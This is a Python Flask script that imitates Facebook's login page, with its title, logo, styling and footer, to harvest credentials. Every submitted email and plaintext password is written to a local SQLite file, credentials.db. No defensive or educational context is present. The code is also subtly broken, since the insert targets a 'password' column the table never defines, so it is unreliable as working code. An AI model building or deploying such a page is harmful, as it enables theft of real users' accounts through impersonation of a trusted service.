from flask import Flask, render_template_string, request, redirect
import sqlite3

app = Flask(__name__)

# Create a simple SQLite DB for credentials
def init_db():
    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL UNIQUE,
            password_hash TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

init_db()

HTML_CODE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Facebook – log in or sign up</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap" rel="stylesheet">
    <style>
        body { background: #f0f2f5; font-family: 'Roboto', Arial, sans-serif; margin: 0; }
        .header { text-align: center; margin-top: 80px; margin-bottom: 20px; }
        .header .logo { color: #1877f2; font-size: 56px; font-weight: bold; letter-spacing: -3px; font-family: 'Roboto', Arial, sans-serif; }
        .login-container { background: #fff; width: 396px; margin: 0 auto; padding: 24px 0 24px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.2), 0 8px 16px rgba(0,0,0,.2); display: flex; flex-direction: column; align-items: center; }
        .login-container form { width: 364px; display: flex; flex-direction: column; align-items: center; }
        .login-container input[type="text"], .login-container input[type="password"] { width: 100%; box-sizing: border-box; background: #f5f6fa; border: 1px solid #dddfe2; border-radius: 6px; padding: 14px 16px; margin-bottom: 12px; font-size: 17px; }
        .login-container button { width: 100%; box-sizing: border-box; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; padding: 14px 0; margin-bottom: 12px; cursor: pointer; transition: background 0.2s; }
        .login-container button:hover { background: #166fe5; }
        .login-container .forgot { display: block; text-align: center; color: #1877f2; font-size: 14px; text-decoration: none; margin-bottom: 20px; }
        .login-container hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; width: 364px; }
        .login-container .create-account { width: 60%; box-sizing: border-box; display: block; margin: 0 auto; background: #42b72a; color: #fff; font-size: 17px; font-weight: bold; border-radius: 6px; border: none; padding: 13px 0; margin-top: 10px; cursor: pointer; transition: background 0.2s; }
        .login-container .create-account:hover { background: #36a420; }
        .footer { text-align: center; font-size: 12px; color: #777; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <span class="logo">facebook</span>
    </div>
    <div class="login-container">
        <form method="POST" autocomplete="off">
            <input type="text" name="email" placeholder="Email address or phone number" autocomplete="off" required>
            <input type="password" name="password" placeholder="Password" autocomplete="off" required>
            <button type="submit">Log In</button>
        </form>
        <a href="#" class="forgot">Forgotten password?</a>
        <hr>
        <button class="create-account">Create new account</button>
    </div>
    <div class="footer">
        &copy; 2025 Facebook
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        # Store credentials in SQLite
        conn = sqlite3.connect('credentials.db')
        c = conn.cursor()
        c.execute('INSERT INTO users (email, password) VALUES (?, ?)', (email, password))
        conn.commit()
        conn.close()
        return render_template_string(HTML_CODE)
    return render_template_string(HTML_CODE)

if __name__ == '__main__':
    app.run(debug=True)